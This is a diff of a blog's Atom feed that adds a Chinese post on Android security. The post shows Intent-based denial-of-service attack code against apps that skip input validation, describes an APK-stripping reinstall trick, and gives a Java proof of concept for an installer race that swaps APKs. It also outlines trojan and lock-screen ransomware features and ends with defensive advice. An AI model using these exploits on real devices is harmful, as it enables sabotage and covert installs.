@@ -4,7 +4,7 @@
   <title><![CDATA[Xiaobin]]></title>
   <link href="http://cyclecircle.github.io/atom.xml" rel="self"/>
   <link href="http://cyclecircle.github.io/"/>
-  <updated>2015-07-23T11:40:56+08:00</updated>
+  <updated>2015-07-24T11:47:42+08:00</updated>
   <id>http://cyclecircle.github.io/</id>
   <author>
     <name><![CDATA[xiaobin]]></name>
@@ -14,7 +14,301 @@
 
   
   <entry>
-    <title type="html"><![CDATA[JAVA多线程-信号灯Semaphore]]></title>
+    <title type="html"><![CDATA[Android安全浅析]]></title>
+    <link href="http://cyclecircle.github.io/blog/2015/07/23/android-security/"/>
+    <updated>2015-07-23T14:36:25+08:00</updated>
+    <id>http://cyclecircle.github.io/blog/2015/07/23/android-security</id>
+    <content type="html"><![CDATA[<p>killBackgroundProcesses引起的事件</p>
+
+<p>前一段时间，知乎上有一个非常热门的话题，就是“美团通过killBackgroundProcesses来杀死竞争对手APP”，
+但是这个话题感觉炒作的成份更多点，或被一些有心人放大了来说，只有一定经验的Android开发，都知道
+killBackgrooundProcesses这个方法并没有想像的那么强大，很多时候，并没有得到想要的效果，而且现在
+的Android都会重新启动那些意外死亡的进程的，所以感觉这事情是被人放大了来炒作了。</p>
+
+<p>如果真要通过杀死竞争对手的APP这种方式来竞争，根本不会用这样的方法了。有一些方法可以让一些APP根本
+无法工作。</p>
+
+<h3>由于自身漏洞引发的无法工作漏洞</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="o">();</span>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">i</span><span class="o">.</span><span class="na">getAction</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;TestForNullPointerException&quot;</span><span class="o">))</span> <span class="o">{</span>
+</span><span class='line'>    <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;TAG&quot;</span><span class="o">,</span> <span class="s">&quot;Test for Android Refuse Service Bug&quot;</span><span class="o">);</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>上面的代码，应试很多人都会这样写，而且也写了不少，看起来没什么问题，但是这个却会引起一个攻击漏洞</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">adb</span> <span class="n">shell</span> <span class="n">am</span> <span class="n">start</span> <span class="o">-</span><span class="n">n</span> <span class="n">xxx</span><span class="o">.</span><span class="na">xxx</span><span class="o">.</span><span class="na">xxx</span><span class="o">/.</span><span class="na">MainActivity</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>遇到这样的攻击代码，可能就会导致APP崩溃，</p>
+
+<p>而且当攻击者通过APP不停的进行攻击时，就会不停的提示崩溃，用户就极有可能会把那相APP卸载
+这样就很可能达到“消灭对手”的目的</p>
+
+<p>再例如下面的代码，就会被人利用来进行攻击</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+</span><span class='line'><span class="n">String</span> <span class="n">test</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">i</span><span class="o">.</span><span class="na">getSerializableExtra</span><span class="o">(</span><span class="s">&quot;serializable_key&quot;</span><span class="o">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>攻击代码（根据对应APP的Intent传递数据缺少校验来进行修改）</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="o">();</span>
+</span><span class='line'><span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&quot;xxx.xxxx.xxxxx&quot;</span><span class="o">,</span> <span class="s">&quot;xxx.xxxx.xxxxx.MainActivity&quot;</span><span class="o">);</span>
+</span><span class='line'><span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&quot;serializable_key&quot;</span><span class="o">,</span> <span class="n">BigInteger</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+</span><span class='line'><span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这个漏洞的情况非常常见，而且可利用的情况非常的多。例如：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+</span><span class='line'><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">intArray</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getIntegerArrayListExtra</span><span class="o">(</span><span class="s">&quot;user_id&quot;</span><span class="o">);</span>
+</span><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">intArray</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">USER_NUM</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="n">intArray</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这样的代码也是很容易就被利用到的</p>
+
+<p>攻击代码：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="o">();</span>
+</span><span class='line'><span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">&quot;xxx.xxxx.xxxxx&quot;</span><span class="o">,</span> <span class="s">&quot;xxx.xxxx.xxxxx.MainActivity&quot;</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">user_id</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;();</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&quot;user_id&quot;</span><span class="o">,</span> <span class="n">user_id</span><span class="o">);</span>
+</span><span class='line'><span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>会有这个漏洞还是因为校验数据合法性的问题，所以在使用传递过来的数据时，应该先做好数据校验，或者加
+上try/catch代码块，以免由于疏忽引起的漏洞被有心人利用。</p>
+
+<blockquote><p>建议：不必要的组件设置为<code>android:exported="false"</code>，对数据做好正确性的校验，通过Intent传递的数据处理加上try/catch。</p></blockquote>
+
+<h3>Android自身漏洞引发的无法工作漏洞</h3>
+
+<p>Android开发者都知道，如果一个APP包名相同，签名不同，是不能覆盖安装的，这样可以防止别人把APP植入
+代码后再重新打包来进行安装。</p>
+
+<p>但是在Android的签名检验里面却有一个漏洞，就是，如果一个apk里面的文件少了，比如apk里面的dex文件少
+了一个文件什么的，这样子的apk，Android的签名校验会认为这个apk没有被修改过。</p>
+
+<p>这样子就会被人利用来让一些APP无法工作，严重的，把整台手机的APP都变成无法工作，让手机彻底变“砖头”</p>
+
+<p>攻击的流程也很简单</p>
+
+<p>在Android设备中，其apk存储路径主要集中在 /data/app (用户应用)，/system/app(系统预装应用)和
+/system/priv-app(系统核心应用)，但这三个文件夹均提供了读权限给任意的用户，不需要root：</p>
+
+<p>这样子，就可以从这些目录里面把手机里的APP读取出来，然后，再删除里面的一些文件，再覆盖安装回去
+这样子，因为签名一样，包名一样，就是提示为升级或覆盖安装，一但安装，那样这个应用就将无法工作</p>
+
+<p>在删除apk中的文件时，不能删除classes.dex、AndroidManifest.xml以及/META-INFO文件夹。</p>
+
+<p>这个漏洞的危害是非常大的，特别是有root的手机，因为可以静默安装，所以防不胜防，没有root的还好，
+因为还会提示应用的安装。</p>
+
+<p>从上面的攻击漏洞可以看到，这个需要用户安装APP，那样子，用户就可以选择不安装就可以了。
+虽然要通过覆盖安装再会生效，这样会比较麻烦，但是事情没有绝对了，有一种方法可以实现无root权限
+来进行“伪静默安装”的</p>
+
+<p>在Android4.3之前，甚至一部分4.3的手机，安装的apk的时候都会有一个漏洞，那就是会被安装的应用会被
+替换掉</p>
+
+<p>通常，安装一个应用会有以下几个流程</p>
+
+<ul>
+<li>弹出权限的确认页面</li>
+<li>用户点击确认之后，就开始进入安装流程，然后就安装成功</li>
+</ul>
+
+
+<p>可以发现，在这两个步骤之间，是有一个时间间隔的，这样，就可以利用这个时间间隔，把原来要安装的
+apk替换成别的apk，这样子就会让安装进去的apk拥有意想不到的权限，</p>
+
+<p>会发生这个是因为Android4.3之前，并没有对apk文件进行再次的校验引起的。</p>
+
+<p>攻击代码示例</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span>
+</span><span class='line'><span class="o">{</span>
+</span><span class='line'>  <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+</span><span class='line'>  <span class="n">setContentView</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="kd">final</span> <span class="n">ActivityManager</span> <span class="n">am</span> <span class="o">=</span> <span class="o">(</span><span class="n">ActivityManager</span><span class="o">)</span> <span class="n">getSystemService</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">ACTIVITY_SERVICE</span><span class="o">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">new</span> <span class="nf">Thread</span><span class="o">(</span><span class="k">new</span> <span class="nf">Runnable</span><span class="o">()</span>
+</span><span class='line'>  <span class="o">{</span>
+</span><span class='line'>      <span class="kd">private</span> <span class="kt">boolean</span> <span class="n">isReplace</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span><span class='line'>      
+</span><span class='line'>      <span class="nd">@SuppressLint</span><span class="o">(</span><span class="s">&quot;SdCardPath&quot;</span><span class="o">)</span>
+</span><span class='line'>      <span class="nd">@Override</span>
+</span><span class='line'>      <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span>
+</span><span class='line'>      <span class="o">{</span>
+</span><span class='line'>          <span class="k">while</span><span class="o">(</span><span class="kc">true</span><span class="o">)</span>
+</span><span class='line'>          <span class="o">{</span>
+</span><span class='line'>              <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&quot;deprecation&quot;</span><span class="o">)</span>
+</span><span class='line'>              <span class="n">List</span><span class="o">&lt;</span><span class="n">RunningTaskInfo</span><span class="o">&gt;</span> <span class="n">taskInfos</span> <span class="o">=</span> <span class="n">am</span><span class="o">.</span><span class="na">getRunningTasks</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+</span><span class='line'>              <span class="n">RunningTaskInfo</span> <span class="n">taskInfo</span> <span class="o">=</span> <span class="n">taskInfos</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'>              <span class="n">ComponentName</span> <span class="n">activity</span> <span class="o">=</span> <span class="n">taskInfo</span><span class="o">.</span><span class="na">topActivity</span><span class="o">;</span>
+</span><span class='line'>              <span class="n">Log</span><span class="o">.</span><span class="na">v</span><span class="o">(</span><span class="s">&quot;vcode&quot;</span><span class="o">,</span> <span class="s">&quot;----&quot;</span> <span class="o">+</span> <span class="n">activity</span><span class="o">);</span>
+</span><span class='line'>              <span class="k">if</span><span class="o">(</span><span class="n">activity</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&quot;PackageInstallerActivity&quot;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isReplace</span><span class="o">)</span>
+</span><span class='line'>              <span class="o">{</span>
+</span><span class='line'>                  <span class="k">try</span>
+</span><span class='line'>                  <span class="o">{</span>
+</span><span class='line'>                      <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">File</span><span class="o">(</span><span class="s">&quot;/sdcard/aaa.apk&quot;</span><span class="o">);</span>
+</span><span class='line'>                      <span class="n">file</span><span class="o">.</span><span class="na">renameTo</span><span class="o">(</span><span class="k">new</span> <span class="nf">File</span><span class="o">(</span><span class="s">&quot;/sdcard/aaa_.apk&quot;</span><span class="o">));</span>
+</span><span class='line'>                      <span class="n">File</span> <span class="n">attackFile</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">File</span><span class="o">(</span><span class="s">&quot;/sdcard/o.apk&quot;</span><span class="o">);</span>
+</span><span class='line'>                      <span class="n">attackFile</span><span class="o">.</span><span class="na">renameTo</span><span class="o">(</span><span class="k">new</span> <span class="nf">File</span><span class="o">(</span><span class="s">&quot;/sdcard/aaa.apk&quot;</span><span class="o">));</span>
+</span><span class='line'>                      <span class="n">isReplace</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span><span class='line'>                      <span class="n">Log</span><span class="o">.</span><span class="na">v</span><span class="o">(</span><span class="s">&quot;vcode&quot;</span><span class="o">,</span> <span class="s">&quot;---------------------&quot;</span> <span class="o">+</span> <span class="n">isReplace</span><span class="o">);</span>
+</span><span class='line'>                  <span class="o">}</span>
+</span><span class='line'>                  <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span>
+</span><span class='line'>                  <span class="o">{</span>
+</span><span class='line'>                      <span class="n">Log</span><span class="o">.</span><span class="na">v</span><span class="o">(</span><span class="s">&quot;vcode&quot;</span><span class="o">,</span> <span class="s">&quot;--&quot;</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+</span><span class='line'>                      <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>                  <span class="o">}</span>
+</span><span class='line'>              <span class="o">}</span>
+</span><span class='line'>              
+</span><span class='line'>              <span class="k">try</span>
+</span><span class='line'>              <span class="o">{</span>
+</span><span class='line'>                  <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">3000</span><span class="o">);</span>
+</span><span class='line'>              <span class="o">}</span>
+</span><span class='line'>              <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span>
+</span><span class='line'>              <span class="o">{</span>
+</span><span class='line'>                  <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>              <span class="o">}</span>
+</span><span class='line'>          <span class="o">}</span>
+</span><span class='line'>      <span class="o">}</span>
+</span><span class='line'>  <span class="o">}).</span><span class="na">start</span><span class="o">();</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这个漏洞是非常强大的，可以实现免root的伪静默安装</p>
+
+<p>除了上面说到的这些漏洞，其实还有很多的漏洞可以实行攻击的，系统级的漏洞我们可能不能做什么
+但是如果是由于自己的疏忽引发的漏洞还是要做好的</p>
+
+<ul>
+<li>allowBackup</li>
+<li>四大组件</li>
+<li>动态加载</li>
+<li>数据库，SharedPreferences</li>
+</ul>
+
+
+<p>这些都是很容易出问题的地方</p>
+
+<p>最后说一下Android的病毒木马</p>
+
+<p>其实Android的病毒木马都是带有强烈的欺骗性的，都是通过模仿别的应用来达到欺骗的效果，
+比如说伪造QQ的密码修改界面，让用户修改，然后就可以盗号了。很多都是这样一个形式</p>
+
+<p>主要有下面的几大模块</p>
+
+<ul>
+<li>一个和官方一样的界面</li>
+<li>读取短信，发送短信，获取通信录的权限（发送短信给通讯录里面的人，传播）</li>
+<li>注册设备管理器*(防止被卸载，隐藏图标等)</li>
+<li>指令模块（短信指令，网络指令）</li>
+</ul>
+
+
+<p>还有一些就是更暴力的，明抢的方式，就是通过锁屏类软件，让用户手机无法使用，如果想要使用，就汇钱
+然后才能打开锁屏。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[JAVA多线程05-信号灯Semaphore]]></title>
     <link href="http://cyclecircle.github.io/blog/2015/07/23/multi-thread-05-semaphore/"/>
     <updated>2015-07-23T11:18:47+08:00</updated>
     <id>http://cyclecircle.github.io/blog/2015/07/23/multi-thread-05-semaphore</id>
